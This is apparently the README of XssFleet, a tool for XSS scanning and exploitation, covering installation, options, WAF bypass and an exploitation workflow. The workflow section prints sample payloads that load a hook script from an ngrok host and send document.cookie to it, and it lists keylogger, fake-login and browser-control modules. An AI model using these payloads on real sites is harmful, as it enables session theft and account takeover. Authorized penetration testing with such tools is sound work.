# XssFleet

![XssFleet](https://img.shields.io/badge/XssFleet-v2.0.0-blue.svg)
![Python](https://img.shields.io/badge/Python-3.8%2B-green.svg)
![License](https://img.shields.io/badge/License-MIT-orange.svg)

## Overview

XssFleet is a comprehensive XSS (Cross-Site Scripting) vulnerability automated penetration testing tool. It integrates advanced detection algorithms from XSStrike and exploitation capabilities inspired by BeEF, providing a complete solution for security professionals to detect, verify, and exploit XSS vulnerabilities.

```
  _   _   _____   _____   ______   _        ______   ______   ______   _______ 
 | \ / | / ____| / ____| |  ____| | |      |  ____| |  ____| |  ____| |__   __|
 |  \/  | | (___   \___ \  | |___   | |      | |___   | |___   | |___      | |   
 |  /\  |  \___ \   ___) | |  ___|  | |      |  ___|  |  ___|  |  ___|     | |   
 | / \ |  ____) | |____/  | |      | |____  | |____  | |____  | |____     | |   
 |_/  \_| |_____/ |_____|  |_|      |______| |______| |______| |______|    |_|   

                    [+] Version: v2.0.0
                   XSS Vulnerability Automatic Scanner

[*] Starting scan for: http://example.com/page?keyword=test
[*] Auto-detected parameters: keyword
[*] Running XSS detection...
  [*] Testing parameter: keyword
    [+] Sending probe to detect reflection points...
    [+] Analyzing response, found 2 reflection point(s)
    [+] Generated 5159 payloads based on context
    [+] Testing top 10 payloads...
    [+] Found 10 potential vulnerabilities in 'keyword'

[+] Found 10 potential vulnerabilities!
```

## Features

### Core Detection Capabilities
- **Reflected XSS Detection**: Automatically scan for reflected XSS in URL parameters
- **Stored XSS Detection**: Detect stored XSS in databases and file-based storage
- **DOM-based XSS Detection**: Analyze JavaScript code for DOM manipulation vulnerabilities
- **HTTP Header XSS**: Scan headers (Referer, User-Agent, Cookie) for XSS vulnerabilities
- **WAF Bypass**: Advanced bypass techniques to evade web application firewalls

### Exploitation Features
- **Browser Hook**: Hook victim browsers for persistent control
- **Cookie Theft**: Steal session cookies from hooked browsers
- **Keylogger**: Capture keystrokes from target browsers
- **Page Information Gathering**: Collect URL, title, localStorage, and sessionStorage
- **Remote Command Execution**: Execute arbitrary JavaScript on hooked browsers
- **ngrok Integration**: Automatic public tunnel creation for payload delivery

### Verification & Reporting
- **Browser Automation**: Verify vulnerabilities using real browsers
- **Detailed Reports**: Generate comprehensive HTML and JSON reports
- **Payload Management**: Organized payload repository with multiple categories
- **Tamper Scripts**: Support for payload modification techniques

## Installation

### Prerequisites
- Python 3.8 or higher
- pip package manager

### Install Dependencies
```bash
git clone https://github.com/xssfleet/xssfleet.git
cd xssfleet
pip install -r requirements.txt
```

### Optional Dependencies
```bash
# For browser verification
pip install selenium

# For ngrok tunneling
pip install pyngrok
```

## Quick Start

### Basic Scan
```bash
python xssfleet/xssfleet.py -u "http://target.com/search?q=test"
```

### Deep Scan Mode
```bash
python xssfleet/xssfleet.py -u "http://target.com/page" -d
```

### POST Request Scan
```bash
python xssfleet/xssfleet.py -u "http://target.com/login" --method POST --data "username=test&password=test"
```

### Exploitation Mode
```bash
python xssfleet/xssfleet.py --exploit
```

### Batch Scan
```bash
python xssfleet/xssfleet.py -m urls.txt --deep
```

## Usage Examples

### Full Vulnerability Scan
```bash
python xssfleet/xssfleet.py -u "http://example.com/vulnerable?q=1" -d -v --verify
```

### WAF Bypass with Tamper Scripts
```bash
python xssfleet/xssfleet.py -u "http://target.com/search?q=test" --tamper=space2comment,base64encode
```

### HTTP Header Scan
```bash
python xssfleet/xssfleet.py -u "http://target.com/page" --headers-scan --cookie "session=abc123"
```

## Exploitation Workflow

```
[*] Loading available payloads...

Available payload types:
  cookie_theft     - Cookie Theft
                     Steal browser cookies via XSS
  keylogger        - Keylogger
                     Capture keystrokes from the target
  redirect         - Redirect
                     Redirect victim to malicious site
  clipboard        - Clipboard Theft
                     Read clipboard contents
  fake_login       - Fake Login
                     Display fake login form to steal credentials
  reverse_shell    - Reverse Shell
                     Full browser control with command execution

Select payload type: cookie_theft

Vulnerability context types:
  html             - HTML tag context - Payload injected directly into HTML tags
  attribute        - HTML attribute context - Payload injected into HTML attributes
  javascript       - JavaScript context - Payload injected into JavaScript code
  dom_based        - DOM-based XSS - Payload executed via DOM manipulation
  url_param        - URL parameter context - Payload as URL parameter value

Tip: If you don't know the context, use 'auto' to generate multiple alternative payloads
Select vulnerability context: auto

[*] Starting XSS exploitation environment...
[*] Found ngrok at: C:\Users\user\AppData\Local\Microsoft\WindowsApps\ngrok.exe

[+] XSS exploitation environment ready!

ngrok URL:
https://abc123.ngrok.io

Generated attack payloads (context: auto):
[1] <script src=https://abc123.ngrok.io/hook></script>
[2] <img src=x onerror=eval(atob('...'))>
[3] <svg onload=fetch('https://abc123.ngrok.io/hook?c='+document.cookie)>
```

1. **Start Exploitation Mode**
```bash
python xssfleet/xssfleet.py --exploit
```

2. **Select Payload Type**
```
Available payload types:
  cookie_theft     - Steal browser cookies via XSS
  keylogger        - Capture keystrokes from the target
  redirect         - Redirect victim to malicious site
  clipboard        - Read clipboard contents
  fake_login       - Display fake login form
  reverse_shell    - Full browser control
```

3. **Inject Payload**
Copy the generated payload and inject it into the target vulnerability.

4. **Monitor Hooked Browsers**
```
Select action:
  1 - Show captured data
  2 - Generate new payloads
  3 - Stop exploitation
```

## Command Line Options

| Option | Description |
|--------|-------------|
| `-u, --url` | Target URL |
| `-m, --batch` | Load URLs from file |
| `-p, --parameter` | Test specific parameter |
| `-d, --deep` | Enable deep scan mode |
| `-b, --bypass` | Enable WAF bypass |
| `--method` | HTTP method (GET/POST) |
| `--data` | POST data string |
| `--headers` | Custom HTTP headers |
| `--cookie` | Cookie string |
| `--headers-scan` | Scan HTTP headers for XSS |
| `--tamper` | Tamper scripts (comma-separated) |
| `--verify` | Verify with browser automation |
| `--browser` | Show browser during verification |
| `-o, --output` | Output directory for reports |
| `-v, --verbose` | Verbose output |
| `--exploit` | Enable XSS exploitation mode |
| `--port` | Listener port (default: 8080) |
| `-h, --help` | Show help message |

## Project Structure

```
xssfleet/
├── core/
│   ├── detector.py        # XSS detection engine
│   ├── exploiter.py       # XSS exploitation module
│   ├── bypasser.py        # WAF bypass techniques
│   ├── verifier.py        # Browser verification
│   ├── payload_manager.py # Payload management
│   └── ngrok_manager.py   # ngrok integration
├── modules/
│   ├── reflected.py       # Reflected XSS module
│   ├── stored.py          # Stored XSS module
│   └── dom.py             # DOM-based XSS module
├── payloads/
│   └── repository.py      # Payload repository
├── utils/
│   ├── http.py            # HTTP request handling
│   ├── report.py          # Report generation
│   ├── logger.py          # Logging utilities
│   └── encoder.py         # Encoding utilities
└── xssfleet.py            # Main entry point
```

## Supported Payload Categories

- **Basic Scripts**: `<script>`, `<img>`, `<svg>` tags
- **Event Handlers**: `onload`, `onmouseover`, `onclick`, `onfocus`
- **Attribute Injection**: `href`, `src`, `action` attributes
- **Unicode Encoding**: HTML entity encoding bypass
- **Double-Write**: Bypass filters via keyword repetition
- **Case Variation**: Mixed case bypass techniques

## Security Disclaimer

This tool is for **authorized security testing only**.

By using XssFleet, you agree that:
1. You have obtained explicit written authorization from the target owner
2. You will not use this tool for unauthorized activities
3. You comply with all applicable laws and regulations
4. You accept full responsibility for your actions

Unauthorized access or attacks may be illegal. Use responsibly.

## Contributing

Contributions are welcome! Please feel free to submit issues and pull requests.

## License

XssFleet is released under the MIT License. See LICENSE file for details.

## Credits

- **XSStrike**: Advanced XSS detection algorithms
- **BeEF**: Browser exploitation framework concepts
- **Selenium**: Browser automation for verification

---

## Star History

<a href="https://www.star-history.com/?repos=jhli07%2FXssFleet&type=date&legend=top-left">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=jhli07/XssFleet&type=date&theme=dark&legend=top-left" />
   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=jhli07/XssFleet&type=date&legend=top-left" />
   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=jhli07/XssFleet&type=date&legend=top-left" />
 </picture>
</a>
